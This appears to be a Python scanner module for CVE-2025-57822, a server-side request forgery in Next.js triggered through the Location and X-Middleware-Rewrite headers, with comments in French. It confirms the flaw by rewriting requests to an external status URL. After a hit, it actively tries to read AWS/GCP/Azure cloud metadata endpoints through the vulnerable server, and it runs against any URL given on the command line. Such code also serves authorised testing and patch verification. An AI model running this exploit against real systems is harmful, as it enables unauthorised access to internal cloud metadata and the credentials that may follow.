#!/usr/bin/env python3
"""
CVE-2025-57822
https://x.com/intigriti/status/1977662600977465794
"""
from utils.style import Colors, Identify
from utils.utils import configure_logger, requests

logger = configure_logger(__name__)

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
)

# URL externe avec réponse unique et status code vérifiable
SSRF_TEST_URL = "https://httpbin.org/status/418"
SSRF_CONFIRMED_STATUS = 418

# Endpoints metadata cloud (AWS, GCP, Azure partagent la même IP)
METADATA_ENDPOINTS = [
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "local-hostname"]),
    ("http://metadata.google.internal/computeMetadata/v1/", ["project-id", "instance"]),
]

HEADERS_PAYLOADS = [
    {"Location": SSRF_TEST_URL},
    {"X-Middleware-Rewrite": SSRF_TEST_URL},
    {"Location": SSRF_TEST_URL, "X-Middleware-Rewrite": SSRF_TEST_URL},
]


def test_internal_ssrf(url: str, s: requests.Session, payload_keys: list[str]) -> None:
    """
    Tente d'atteindre les endpoints de métadonnées cloud via SSRF confirmé.
    """
    for metadata_url, keywords in METADATA_ENDPOINTS:
        internal_payload = {k: metadata_url for k in payload_keys}
        try:
            req = s.get(
                url, headers=internal_payload, verify=False,
                timeout=5, allow_redirects=False,
            )
            if any(kw in req.text.lower() for kw in keywords):
                print(
                    f" {Identify.confirmed} | CVE-2025-57822 | INTERNAL SSRF | "
                    f"{Colors.BLUE}{url}{Colors.RESET} | "
                    f"Can access cloud metadata: {metadata_url}"
                )
                return
        except requests.exceptions.RequestException:
            pass


def nextjs_ssrf(url: str) -> bool:
    """
    Teste CVE-2025-57822 (Next.js SSRF via Location/X-Middleware-Rewrite headers)

    Args:
        url: URL cible

    Returns:
        True si une détection a eu lieu
    """
    with requests.Session() as s:
        s.headers.update({"User-Agent": DEFAULT_USER_AGENT})

        # Baseline propre avant tout test
        try:
            req_baseline = s.get(url, verify=False, timeout=10, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            logger.error("baseline request failed %s: %s", url, e)
            return False

        for payload in HEADERS_PAYLOADS:
            try:
                req_ssrf = s.get(
                    url, headers=payload, verify=False,
                    timeout=10, allow_redirects=False,
                )

                # Vérification par status code (plus fiable que la recherche textuelle)
                ssrf_detected = (
                    req_ssrf.status_code == SSRF_CONFIRMED_STATUS
                    and req_ssrf.status_code != req_baseline.status_code
                )

                if ssrf_detected:
                    print(
                        f" {Identify.confirmed} | CVE-2025-57822 | SSRF | "
                        f"{Colors.BLUE}{url}{Colors.RESET} | "
                        f"PAYLOAD: {payload}"
                    )
                    test_internal_ssrf(url, s, list(payload.keys()))
                    return True  # un payload confirmé suffit

            except requests.exceptions.Timeout:
                logger.error("timeout testing %s with payload %s", url, payload)
            except requests.exceptions.InvalidHeader:
                logger.error("invalid header in payload: %s", payload)
            except requests.exceptions.ConnectionError as e:
                logger.error("connection error %s: %s", url, e)
            except Exception as e:
                logger.error("error testing SSRF %s: %s", url, e)

    return False


if __name__ == "__main__":
    import sys
    from utils.utils import urlparse

    if len(sys.argv) != 2:
        print("Usage: python CVE202557822.py <URL>")
        sys.exit(1)

    target_url = sys.argv[1]
    parsed = urlparse(target_url)

    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        print("Error: invalid URL. Must start with http:// or https://")
        sys.exit(1)

    try:
        nextjs_ssrf(target_url)
    except KeyboardInterrupt:
        print("\nExiting")
        sys.exit(0)